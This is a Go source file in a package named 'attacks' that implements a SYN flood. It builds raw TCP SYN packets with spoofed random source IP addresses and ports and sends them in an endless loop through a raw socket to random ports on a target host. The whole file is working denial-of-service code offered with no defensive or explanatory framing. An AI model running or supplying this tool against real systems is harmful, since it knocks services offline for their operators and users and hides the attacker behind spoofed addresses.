package attacks

import (
	"fmt"
	"log"
	"math/rand"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"golang.org/x/net/ipv4"
)

type Attacker func(host string)

// buildIpPacket generates a layers.IPv4 and returns it with source IP address and destination IP address
func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
	return &layers.IPv4{
		SrcIP:    net.ParseIP(srcIpStr).To4(),
		DstIP:    net.ParseIP(dstIpStr).To4(),
		Version:  4,
		Protocol: layers.IPProtocolTCP,
		TTL:      64,
	}
}

// buildTcpPacket generates a layers.TCP and returns it with source port and destination port
func buildSynTcpPacket(srcPort, dstPort int) *layers.TCP {
	return &layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		Window:  1505,
		Urgent:  0,
		Seq:     11050,
		Ack:     0,
		ACK:     false,
		SYN:     true,
		FIN:     false,
		RST:     false,
		URG:     false,
		ECE:     false,
		CWR:     false,
		NS:      false,
		PSH:     false,
	}
}

func getIps() []string {
	ips := make([]string, 0)
	for i := 0; i < 20; i++ {
		ips = append(ips, fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256),
			rand.Intn(256), rand.Intn(256)))
	}

	return ips
}

func getPorts() []int {
	ports := make([]int, 0)
	for i := 1024; i <= 65535; i++ {
		ports = append(ports, i)
	}

	return ports
}

var ips = getIps()
var ports = getPorts()

func constructPacket(destHost string, destPort int) (error, *ipv4.Header, gopacket.SerializeBuffer) {
	payload := gopacket.Payload([]byte{'h', 'i'})
	var err error
	tcpPack := buildSynTcpPacket(ports[rand.Intn(len(ports))], destPort)
	ipPack := buildIpPacket(ips[rand.Intn(len(ips))], destHost)
	tcpPack.SetNetworkLayerForChecksum(ipPack)
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	ipHeaderBuf := gopacket.NewSerializeBuffer()
	err = ipPack.SerializeTo(ipHeaderBuf, opts)
	if err != nil {
		return err, nil, nil
	}
	ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
	if err != nil {
		panic(err)
	}

	tcpPayloadBuf := gopacket.NewSerializeBuffer()
	var data []byte = make([]byte, 1)
	rand.Read(data)
	payload = gopacket.Payload(data)
	err = gopacket.SerializeLayers(tcpPayloadBuf, opts, tcpPack, payload)
	if err != nil {
		panic(err)
	}

	return nil, ipHeader, tcpPayloadBuf
}

func sendPacket(ipHeader *ipv4.Header, data gopacket.SerializeBuffer) error {
	packetConn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if err != nil {
		return err
	}
	rawConn, err := ipv4.NewRawConn(packetConn)
	if err != nil {
		return err
	}

	err = rawConn.WriteTo(ipHeader, data.Bytes(), nil)
	rawConn.Close()
	return err
}

func SynFlood(host string) {
	for {
		port := rand.Intn(64000) + 1024
		err, header, data := constructPacket(host, port)
		if err != nil {
			log.Fatal(err)
		}
		err = sendPacket(header, data)
		if err != nil {
			log.Println("Error during sending packet")
			log.Fatal(err)
		}
	}
}
